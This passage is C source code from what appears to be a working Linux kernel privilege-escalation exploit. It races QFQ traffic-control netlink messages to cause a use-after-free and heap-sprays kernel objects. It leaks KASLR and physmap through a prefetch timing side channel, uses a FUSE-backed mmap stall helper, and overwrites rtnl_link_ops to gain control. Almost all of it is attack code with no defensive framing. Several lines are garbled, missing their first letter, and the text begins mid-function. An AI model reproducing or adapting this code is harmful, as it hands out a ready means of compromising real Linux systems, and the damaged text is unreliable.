    }
    pgvDel(1);
}

void LL_ATK() {
    // Trig Function: __rtnl_newlink
    struct {
        struct nlmsghdr nh;
        struct ifinfomsg ifi;
        char buf[1024];
    } req;

    struct rtattr *rta;
    int sock;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };

    // Create a netlink socket
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));

    // Netlink message header
    req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifi));
    req.nh.nlmsg_type = RTM_NEWLINK;
    req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    // Interface info
    req.ifi.ifi_family = AF_UNSPEC;

    // Add VLAN attributes
    rta = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nh.nlmsg_len));
    rta->rta_type = IFLA_LINKINFO;
    rta->rta_len = RTA_LENGTH(0);

    struct rtattr *rta_data = (struct rtattr *)(((char *)rta) + RTA_ALIGN(rta->rta_len));
    rta_data->rta_type = IFLA_INFO_KIND;
    rta_data->rta_len = RTA_LENGTH(strlen("ipvlan") + 1);
    strcpy((char *)RTA_DATA(rta_data), "ipvlan");

    rta->rta_len = RTA_ALIGN(rta->rta_len) + RTA_ALIGN(rta_data->rta_len);

    req.nh.nlmsg_len = NLMSG_ALIGN(req.nh.nlmsg_len) + RTA_ALIGN(rta->rta_len);

    write(sock,&req, req.nh.nlmsg_len);
    return 0;
}

int interrupter(){
    unsigned long int tmp;
    pinCPU(1); // Make sure we are on the same CPU as del
    setNice(-20);
    signal(SIGALRM, handler);
    struct itimerval t = {
        .it_interval = {0, 13},  // 1 µs
        .it_value = {0, 13}
    };
    setitimer(ITIMER_REAL, &t, 0);
    // Pause the thread until a signal comes,
    // the while-loop keeps interrupting the core
    while(1) pause();
}

tatic void delay(size_t n){
  size_t end;
  end = rdtsc()+n;
  // Wait for n cycles
  while(rdtsc()<end);
  return;
}

oid thr_racee(){
    setNice(19);
    flag1 = 1;
    stop = 0 ;
    // Wait for another thread is ready for sync
    while(!flag3);
    delay(racee_delay);
    // CPU 1
    NLMsgSend(nl,del1); // del -> dec;
    stop = 1;
}

oid thr_racer(){
    setNice(-20);
    flag2 = 1;
    while(!flag3);
    delay(racer_delay);
    // CPU 0
    // Keep racing until stop is set by another thread
    while(!stop){
        write(inet_sock_fd, "", SK_BUFF_DATA_SIZE); // upgrade
        NLMsgSend(nl,tclass_0x20002_create); // change it back
    }
}

oid race_attemp(){
    unsigned long int thrs[2];
    pinCPU(1);
    pthread_create(&thrs[0],0,thr_racee,0);
    pinCPU(0);
    pthread_create(&thrs[1],0,thr_racer,0);
    // Wait until two threads are ready to run
    while(!flag1 || !flag2);
    flag3 = 1;
    pthread_join(thrs[0],0);
    pthread_join(thrs[1],0);
}

oid cardshark(long long align_time){
    flag1 = flag2 = flag3 = 0;
    if(align_time  > 0 )
      racer_delay = align_time;
    else
      racee_delay = -align_time;
    race_attemp();
}

oid init_loopbacksend (u32 prio) {
    struct sockaddr iaddr = { AF_INET };
    inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    int res = setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    connect(inet_sock_fd, &iaddr, sizeof(iaddr));
}

oid initContext(){
    // In this function, we prepare the blob to send later since it's a small racing window 
    // so we do these preparation work earlier.
    trash = calloc(1,0x1000);
    memset(trash,'i',0x1000);

    msgQdiscCreate =        qfqQdiscAdd(targetClass>>16<<16,-1);
    tclass_0x20001_create = qfqClassAdd(TCA_QFQ_LMAX,0x20001,LMAX_VAL_1);
    tclass_0x20002_create = qfqClassAdd(TCA_QFQ_LMAX,0x20002,LMAX_VAL_1);
    tclass_0x20003_create = qfqClassAdd(TCA_QFQ_LMAX,0x20003,LMAX_VAL_2);
    tclass_0x20004_create = qfqClassAdd(TCA_QFQ_LMAX,0x20004,LMAX_VAL_2);
    msgQdiscClass_upgrade = qfqClassAdd(TCA_QFQ_LMAX,0x20002,LMAX_VAL_2);
    tclass_0x20001_update = qfqClassAdd(TCA_QFQ_LMAX,0x20001,LMAX_VAL_2);
    del1 = classDel(0x20001);
    del2 = classDel(0x20002);
    del3 = classDel(0x20003);
    del4 = classDel(0x20004);


    // (in qemu, the first run is slow but the syscall time cost gonna be stable after warmup)
    // We prepare two types of messages (add/del) for warmup before racing.
    // index 0x00-0x20: Add
    // index 0x20-0x40: Del
    for(int i = 0; i < 0x20 ; i++){
      classAddMsg[i]      = qfqClassAdd(TCA_QFQ_LMAX,0x21000+i,LMAX_VAL_3);
      classAddMsg[i+0x20] = classDel(0x21000+i);
    }

    // We prepare some messages for spray
    // (if we update the class lmax with an not existing lmax, kerenl will create a new agg)
    // index 0x00 -0x80 : Allocate the qdisc waiting for agg upgrade
    // index 0x80 -0x100: Update agg, for index 0x00 - 0x80, to allocate new aggs 
    // index 0x100-0x180: Delete the qdiscs to reset the enviroment so we can keep trying
    for(int i = 0; i < 0x80 ; i++){
      spray_obj[i]         = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x10,LMAX_VAL_3);
      spray_obj[i+0x80]    = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x10,LMAX_VAL_3+(i+1)*0x10);
      spray_obj[i+0x100]   = classDel(0x20000+i+0x10);
    }

    // We need 0x7 partial slab to fill the per_cpu partial
    // then we can evict the target slab in cpu partial to budysystem
    for(int i = 0 ;i< 8; i++)
    {
      partial_slab_obj[i]       = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x100,LMAX_VAL_3);
      partial_slab_obj[i+8]     = qfqClassAdd(TCA_QFQ_LMAX,0x20000+i+0x100,LMAX_VAL_2+(i+1)*0x10);
      partial_slab_obj[i+0x10]  = classDel(0x20000+i+0x100);
    }
    // Init payload for NPerm
    // NPERM_SPACE+0x40 is where our fake rtnl_link_ops is
    // NPERM + LL_ATK will write nperm_addr to ll_target
    // So BOND_LINK_OPS->next is set to NPERM_SPACE+0x40
    size_t ll_target    = BOND_LINK_OPS         - NO_ASLR_BASE + leaked_kaslr;
    size_t nperm_addr   = NPERM_SPACE + 0x40    - NO_ASLR_BASE + leaked_kaslr;
    memset(payload,0,sizeof(payload));
    // payload[0] = 1;             // Copied the original valid agg to avoid crash earlier
    // payload[1] = 2;             // Copied the original valid agg to avoid crash earlier 
    // payload[5] = 0x30000000001; // Copied the original valid agg to avoid crash earlier 
    // payload[6] = 0x30000000000; // Copied the original valid agg to avoid crash earlier 
    // payload[7] = 0x30000000300; // Copied the original valid agg to avoid crash earlier 
    payload[8] = 1;             // Fake num_classes, need to be 1 so we can free it
    payload[11] = nperm_addr;
    payload[12] = ll_target;
}

oid warm(){
    for(int i = 0; i < 0x20; i++)
        NLMsgSend(nl,classAddMsg[i]); // del -> dec;
    for(int i = 0 ; i < 0x100 ; i ++)
        write(inet_sock_fd, "", 0x200-42); // warmup
    for(int i = 0x20; i < 0x40; i++)
        NLMsgSend(nl,classAddMsg[i]); // del -> dec;
}

oid exp(){
    // Exploitation starts
    // We assume the refcnt of the agg is now 2, it could be 4 or 3 (not exploitable)
    /*
        qfq_agg -> refcnt:
         2 (vul)
         4 (vul but not exploitable)
         3 normal
        qfq_qdisc: 0x20000 
        (Deleted) qfq_class 0x20001  -> lmax 0x400 
        (Active)  qfq_class 0x20002  -> lmax 0x400 
        (Active)  qfq_class 0x20003  -> lmax 0x400
        (Active)  qfq_class 0x20004  -> lmax 0x400
    */
    for(int i = 0 ; i < 0x80 ; i++)
        NLMsgSend(nl,spray_obj[i+0x100]);
    for(int i = 0 ; i < 8 ; i++)
        NLMsgSend(nl,partial_slab_obj[i+0x10]);
    NLMsgSend(nl,del2);

    NLMsgSend(nl,del3);
    pgvDel(1);
    pgvDel(0);
    pgvAdd(1,0,0x100);
    char * res = pgvMap(1); // map the page
    for(int i = 0 ; i < 0x100 ; i ++)
        for(int k = 0 ; k < 0x20 ; k++)
            memcpy(res+i*0x1000+k*0x80,payload,0x80);
    NLMsgSend(nl,del4); // UAF free 2 LL ATK
    LL_ATK(); // win 
    pgvDel(1);
}

ize_t cardprobe(int item){
    size_t start,end;
    pinCPU(item);
    if(item == 0){
        sched_yield();
        start = rdtsc();
        write(inet_sock_fd, "", SK_BUFF_DATA_SIZE); 
        end = rdtsc();
    }
    else if(item == 1){
        sched_yield();
        start = rdtsc();
        NLMsgSend(nl,del1); 
        end = rdtsc();
    }
    return end - start;
}

oid probe(u64 nudge){
    pinCPU(0);
    sandbox();
    impLimit();
    // 0) Init the network 
    int res = syz_net_reset();
    // 1) Prepare
    // 1.0) Prepare for xdp spray: GFP_KERNEL 0x100
    for(int i = 0 ; i < 0x100; i++)
        xdp_fd[i] = xdpInit();

    // 1.1) Prepare data path sender for qdisc 0x20002, which triggers qfq_enqueue/qfq_dequeue
    init_loopbacksend(0x20002);

    // 1.2) Prepare fd to send packets to lo, so we can reach the qfq control path and data path
    nl = initNL();

    // 1.3) Prepare PGV pages "0x40 order-0 pages" and "0x2 order-4 pages"
    //  so we can later evict the per_cpu partial
    pgvAdd(1,0,0x40);
    pgvAdd(0,4,2);
    // 1.4) Defrag size 0x80
    msgSpray_t * df1 = msgSpray(0x80-0x30,0x200,trash);

    // 2) Trigger the Bug
    // 2.1) Create the qfq qdisc
    NLMsgSend(nl,msgQdiscCreate);
    // 2.2) Allocate 0x8 0x100-size objects for later free so we can use them to fill cpu_partial. (0x7 is actually enough)
    for(int i = 0 ; i < 8;i++)
        NLMsgSend(nl,partial_slab_obj[i]);
    for(int k = 0 ; k < 8; k++)
    {
        NLMsgSend(nl,partial_slab_obj[k+8]);
        // use xdp to take the whole slab, but we only free partial_slab_obj
        // so these slab gonna be partial to later evit the victim slab
        for(int i = 0 ; i < 0x20; i++ )
            munmap_list[i+k*0x20] = xdpUmemAdd(xdp_fd[i+k*0x20], 0x1000); 
    }

    // 2.3) Create qdisc 0x20001 and qdisc 0x20002, their LMAX are 0x200  
    NLMsgSend(nl,tclass_0x20001_create); // 0x20001 -> 0x200
    NLMsgSend(nl,tclass_0x20002_create); // 0x20002 -> 0x200

    // 2.4) Make sure we have these qdiscs before we update their agg
    for(int i = 0 ; i < 0x80 ; i++)
        NLMsgSend(nl,spray_obj[i]);

    // 2.5-2.7) basically we want to ensure that the slab where victim is would be taken by us 
    // so we can later free the whole slab and let it be back to budysystem
    // When I say after/before in 2.5-2.7 it's not accurate since random freelist

    // 2.5) Take the area before the target obj by spraing agg 
    for(int i = 0 ; i < 0x40; i++)
        NLMsgSend(nl,spray_obj[i+0x80]);
    // 2.6) Update will create a new agg so it will allocate the target obj
    NLMsgSend(nl,tclass_0x20001_update);
    // 2.7) Take the area after the target obj by spraing aggg 
    for(int i = 0x40 ; i < 0x80; i++)
        NLMsgSend(nl,spray_obj[i+0x80]);

    // 3) Create two tclass for later use
    NLMsgSend(nl,tclass_0x20003_create); // 3
    NLMsgSend(nl,tclass_0x20004_create); // 4 
    // 4) Warn up before racing
    warm();
    // 5) Give up current slot so the late code are less likely to be interrupted
    sched_yield();
    // 6) Cardshark to race
    cardshark(nudge);
    // 7) Assume race hits and we start exploitation
    exp();

OUT:
    msgSprayClean(df1);
    exit(0);
}

oid NPERM(){
    int pid =fork();
    if(pid==0){
        nperm();
        exit(0);
    }
    waitpid(pid,0,0);
}

tatic inline int64_t now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

nt main(int argc, char *argv[]){
    pinCPU(1);
    for(int i  = 0 ;  i < 100; i ++) {
        leaked_kaslr = get_kaslr_precise(1)-0x2000000;
        info(hex(leaked_kaslr));
    }

    COREHEAD(argv);
    NPERM();
    if (fork() == 0) 
    {
        pinCPU(1);
        setsid();
        crash(666,"/tmp/exp");
    }
    initContext();
    unsigned long int thrs;
    pthread_create(&thrs, 0, interrupter, 0);

    const int64_t budget_ms = 28LL * 60 * 1000;  // 28 minutes
    const int64_t deadline  = now_ms() + budget_ms;

    for (;;) {
        for (int i = -2000; i < 0; i++) {
            printf(">> %d\n",i);
            for (int k = 0; k < 10; k++) {
                if (now_ms() >= deadline) goto doneX;  // stop before launching new work

                pid_t pid = fork();
                if (pid == 0) {
                    probe(1700 + 85 + i * 10);
                    _exit(0);
                } else if (pid > 0) {
                    int status;
                    (void)waitpid(pid, &status, 0);
                } else {
                    // fork failed; bail out
                    goto doneX;
                }
            }
        }
    }
doneX:
    info("n132 >>");
    return 0;
}

static int getattr_callback(const char *path, struct stat *stbuf)
{
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/pwn") == 0)
    {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }

    return -ENOENT;
}

static int read_callback(const char *path, char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{

    if (strcmp(path, "/pwn") == 0)
    {
        printf("[FUSE] X\n");
        if (fault_cnt++ <100000)
        {

            sleep(3);
            printf("[FUSE] Sleep DONE in READ\n");
            return size;
        }
        else
        {
            printf("[FUSE] Y\n");
        }
    }
    return -ENOENT;
}

void *fuse_thread(void *_arg)
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    if (mkdir("/tmp/test", 0777))
        panic("mkdir(\"/tmp/test\")");

    if (!(chan = fuse_mount("/tmp/test", &args)))
        panic("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
    {
        fuse_unmount("/tmp/test", chan);
        panic("fuse_new");
    }

    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        panic("sched_setaffinity");

    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    fuse_loop_mt(fuse);

    fuse_unmount("/tmp/test", chan);
    return NULL;
}

void *mmap_fuse_file(void * addr)
{
    if (pwn_fd != -1)
        close(pwn_fd);
    pwn_fd = open("/tmp/test/pwn", O_RDWR);
    if (pwn_fd == -1)
        panic("Failed to open /tmp/test/pwn");

    void *page;
    if(addr==0){
        addr = 0xdeadbeef000;
    }
    page = mmap((void *)addr, 0x1000, PROT_READ | PROT_WRITE,
                0x2, pwn_fd, 0);
    if (page == MAP_FAILED)
        panic("mmap");
    return page;
}

void * initFuse(void ){
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    pthread_t th;
    pthread_create(&th, NULL, fuse_thread, NULL);
    while (!setup_done);
    return mmap_fuse_file(0);
}

uint64_t sidechannel(size_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "mfence;"
    "prefetcht0 qword ptr [%4];"
    "prefetcht0 qword ptr [%4];"
    "mfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

void clean_cache(size_t base){
    for(int i=0;i<0x100;i++){
        // Access Order
        // int mess = (i*167+13)%0x200; // Makes no diff
        size_t mess = i;
        size_t probe = (mess*0x1000+base);
        // prefecth access
        sidechannel(probe);
    }
}

u64 leak_syscall_entry(int pti) 
{
    sched_yield();
    u64 data[ARR_SIZE] = {0};
    u64 min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + 2; i++)
    {
        for (u64 idx = 0; idx < ARR_SIZE; idx++) 
        {
            u64 time = sidechannel(SCAN_START + idx * STEP);
            // clean_cache((size_t)trash);
             if (i >= 2)
                data[idx] += time;
        }
    }
    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    if(pti){
        u64 previous_data = data[0];
        // More analysis for pti
        for(int i = 0x1; i< ARR_SIZE; i++)
        {
            if(data[i]>previous_data*1.1) // outliner
                continue;
            // Find the `dent`
            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && data[i]<min*1.05)
            {
                addr = SCAN_START + i * STEP;
                break;
            }
            previous_data = data[i];
        }
    }
    return addr;
}

u64 _leak_phys(size_t pti) 
{
    // When pti = on, make sure pcid is on for /proc/cpu
    if(pti==1){

        panic("You may provide an offset of the kernel page on user space, e.g., 0x11c132000");
        exit(1);
    }
    sched_yield();

    u64 data[ARR_SIZE_PHYS] = {0};
    u64 min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (u64 idx = 0; idx < ARR_SIZE_PHYS; idx++) 
        {

            u64 probe = SCAN_START_PHYS + idx * STEP_PHYS + pti;
            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
            u64 time = sidechannel(probe);

            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    // We start at 0x40 since we warmed up 0x40 times before it

        for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
        {
            data[i] /= ITERATIONS;
            if (data[i] < min)
            {
                min = data[i];
                addr = SCAN_START_PHYS + i * STEP_PHYS ;
            }
        }
        int previous_data = data[0x40];
        // More analysis for pti
        for(int i = 0x41; i< ARR_SIZE_PHYS; i++)
        {
            if(data[i]>previous_data*1.1)
                continue;

            if( data[i]< previous_data && \
                (double)previous_data*0.9375 > (double)data[i] && \
                data[i] < min*1.0625 )
            {
                addr = SCAN_START_PHYS + i * STEP_PHYS ;
                break;
            }
            previous_data = data[i];
        }

    return addr;
}

size_t _find_duplicate(size_t a, size_t b, size_t c) {
    if (a == b || a == c)
        return a;
    if (b == c)
        return b;
    return 0; // all different
}

size_t get_kaslr_precise(int pti){
    size_t val[3];
    for(int i = 0; i < 3 ; i++)
        val[i] = get_kaslr(pti);
    size_t res = _find_duplicate(val[0],val[1],val[2]);
    if(res)
        return res;
    else
        return get_kaslr_precise(pti);

}

size_t get_physmap_precise(size_t pti){
    size_t val[3];
    for(int i = 0; i < 3 ; i++)
        val[i] = _leak_phys(pti);
    size_t res = _find_duplicate(val[0],val[1],val[2]);
    if(res)
        return res;
    else
        return get_physmap_precise(pti);
}

size_t fread_u64(const char *fname)
{
    size_t size = 0x100;
	FILE *f = fopen(fname, "r");
    if(!f) return 0xdeadbeef;
	char *buf = calloc(1,size+1);
	fread(buf, 1, size, f);
	buf[size] = 0;
	fclose(f);
	return atoll(buf);
}

size_t msgLimit(){
    if(!MSGLIMIT){
        size_t size = fread_u64(MSGMNB_FILE);;
        if(size == 0xdeadbeef || size == 0)
        {
            warn("Failed to load MSG Limit, asssume it's 8192");
            size = 8192;
        }    
        MSGLIMIT = size;
        return size;
    }else{
        return MSGLIMIT;
    }
}

__u8 * dpn(int c,size_t n,size_t nn){
    FAIL(nn<n,"Wrong usage of dpn");
    char* res = malloc(nn+1);
    memset(res,0,nn);
    memset(res,c,n);
    res[n] = 0;
    return res;
}

__u8 * flatn(size_t *values,size_t n){
    size_t * res = malloc(sizeof(size_t)*n+1);
    for(int i = 0 ; i < n; i++){
        res[i] = values[i];
    }
    return (__u8 *)res;
}

int findp64(__u8 *stack,size_t value, size_t n){
    size_t * ptr;
    FAIL_IF(n<8);
    for(size_t i =0 ; i <= n-8; i++){
        ptr = (size_t *)&stack[i];
        if(value == *ptr)
            return i;
    }
    return -1;
}

